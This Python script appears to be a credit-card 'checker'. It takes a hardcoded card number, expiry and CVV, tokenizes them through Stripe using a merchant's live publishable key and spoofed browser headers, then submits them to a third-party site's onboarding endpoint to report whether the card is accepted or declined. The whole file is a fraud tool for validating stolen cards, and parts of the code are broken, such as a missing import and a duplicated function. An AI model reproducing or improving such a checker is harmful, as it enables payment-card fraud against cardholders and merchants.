		#REQUIREMENTS
import requests
import json
import random
import string
import os

		#RANDOM GMAIL GENERATOR
def email ():
	return ''.join (random.choice(string.ascii_lowercase)for x in range (random.randint(7,15)))+ str(random.randint(1111, 9999)) + '@gmail.com'

		#LISTA BREAK
def pregs(list):
	arrays = re.findall (r'[0-9]+', list)
	return arrays


		#MAIN FUNCTION

list= '4052060012257377|08|2024|441'
def pregs(list):
	arrays = re.findall (r'[0-9]+', list)
	return arrays

		# FIRST REQUEST CC
arrs = pregs(list)
cc = arrs[0]
month = arrs[1]
year = arrs[2]
cvv = arrs[3]

		#STRIPE API

url = 'https://api.stripe.com/v1/tokens'

headers = {

'Host': 'api.stripe.com',
'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0',
'Accept': 'application/json',
'Accept-Language': 'en-US,en;q=0.5',
'Referer': 'https://js.stripe.com/',
'Content-Type': 'application/json;charset=UTF-8',
'Origin': 'https://js.stripe.com',
'Content-Length': '717',
'Connection': 'keep-alive',
'Sec-Fetch-Dest': 'empty',
'Sec-Fetch-Mode': 'cors',
'Sec-Fetch-Site': 'same-site',
}

postdata= {
'card[number]': cc,
'card[cvc]': cvv,
'card[exp_month]': month,
'card[exp_year]':	year,
'pasted_fields': 'number',
'payment_user_agent':'stripe.js/4da86323c;+stripe-js-v3/4da86323c',
'time_on_page':	'25153',
'key':'pk_live_I0HVPY6Yc8zOWi1kbazgVcE4',

}

		#POST REQUEST

post =(requests.post(url= url, headers = headers, data = postdata))
		#JSON DECODE
post = json.loads(post.text	)
		#2nd Request API

url = 'https://dashboard.kicksta.co/onboarding/'

headers = {
'Host': 'dashboard.kicksta.co',
'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0',
'Referer': 'https://dashboard.kicksta.co/',
'Content-Type': 'application/json;charset=utf-8',
'Content-Length':'177',
'Origin': 'https://kicksta.co',
'Connection': 'keep-alive',
'Sec-Fetch-Dest': 'empty',
'Sec-Fetch-Mode': 'cors',
'Sec-Fetch-Site': 'same-origin'
}


now = requests.post(url = url, headers = headers, data = postdata)

load = json.loads(now.text)

time = now.elapsed.total_seconds()
time = str(time)
time = time [0:4]+'s'

			#FUCKING RESPONSE

if 'Registration' in now.text:
	print('CC: '+list+' Message: '+load["stripe"]+' Time: '+time)
elif 'redirect' in now.text:
	print('CC '+list+' Message: Success'+'Time:'+time) 
	if 'decline_code' in now.text:
		declinecode = load["stripe"]["decline_code"]
else:
	declinecode = load["stripe"]["code"]
	print('CC: '+list+' Message:'+declinecode+' Time:'+time)

